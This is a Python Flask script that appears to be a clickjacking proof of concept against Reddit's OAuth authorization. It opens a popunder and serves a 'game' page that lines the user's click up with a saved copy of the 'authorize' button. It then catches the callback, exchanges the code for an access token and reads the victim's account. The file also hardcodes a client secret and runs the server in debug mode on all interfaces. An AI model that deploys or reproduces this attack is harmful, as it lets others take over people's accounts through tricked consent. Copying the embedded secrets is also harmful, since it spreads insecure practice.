#!/usr/bin/env python3
from glob import glob
from flask import Flask, jsonify, redirect, render_template, session, url_for, request
import requests
import os

CLIENT_ID = "l9528hDwAplYb_o9V3a30w"
CLIENT_SECRET = "7MydBK8GzNU4fYFfGT1BwLWeOG9kXg"
REDIRECT_URI = "http://localhost:5000/callback/reddit"

GOOGLE_CLIENT_ID = "287301326956-7hs3lvrtj9u0rfnnj0sa3djmu773dcbt.apps.googleusercontent.com"
POPUP_SIZE = [535,699]
# BUTTON_OFFSET = { "pos": [289, 342], "size": [49, 22]}

BUTTON_SELECTOR = 'input[name="authorize"]'
USE_HISTORY_BACK = True

app = Flask(__name__)
app.secret_key = os.urandom(24)


# Look for saved target as HTML to use with BUTTON_SELECTOR
if button := globals().get("BUTTON_OFFSET") is None:
    saved_target_path = os.path.join(app.root_path, "static", "saved-target")
    if not (saved_target := glob(os.path.join(saved_target_path, "*.html"))):
        raise FileNotFoundError(
            f"No file found at {os.path.join(saved_target_path, '*.html')}")
    if not glob(os.path.join(saved_target_path, "*_files")):
        raise FileNotFoundError(
            f"No directory found at {os.path.join(saved_target_path, '*_files')}")

    button = {"url": "/" + os.path.relpath(saved_target[0], app.root_path),
              "selector": globals().get("BUTTON_SELECTOR")}
    print("Found saved target:", button)
    assert button['selector'], "BUTTON_SELECTOR not found, please set it to the selector of the button you want to click"


@app.route("/")
def index():
    print(session)
    # 4. Upon reload, get token from session
    if session.get("access_token"):
        access_token = session.get("access_token")

        r = requests.get("https://oauth.reddit.com/api/v1/me", headers={
            "Authorization": f"Bearer {access_token}"
        })

        return jsonify(r.json())

    # 1. Create popunder
    domain = request.host.split(":")[0]
    return render_template("index.html", google_client_id=GOOGLE_CLIENT_ID, domain=domain)


@app.route("/game")
def game():
    # 2. Prepare oauth url to send to callback
    url = f"https://www.reddit.com/api/v1/authorize?client_id={CLIENT_ID}&response_type=code&state={os.urandom(16).hex()}&redirect_uri={REDIRECT_URI}&duration=temporary&scope=history"

    return render_template("game.html", url=url, button=button, popup_size=POPUP_SIZE, use_history_back=USE_HISTORY_BACK)


@app.route("/clear")
def clear():
    session.clear()
    return redirect(url_for("index"))


@app.route("/callback")
def callback():
    # 3. Receive callback and exchange code for token
    print(request.args)
    code = request.args.get("code")

    r = requests.post("https://www.reddit.com/api/v1/access_token", data={
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "code": code,
        "grant_type": "authorization_code",
        "redirect_uri": REDIRECT_URI
    })
    json = r.json()
    print(json)
    session["access_token"] = json.get("access_token")

    return '<script>window.close()</script>'


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=8000)
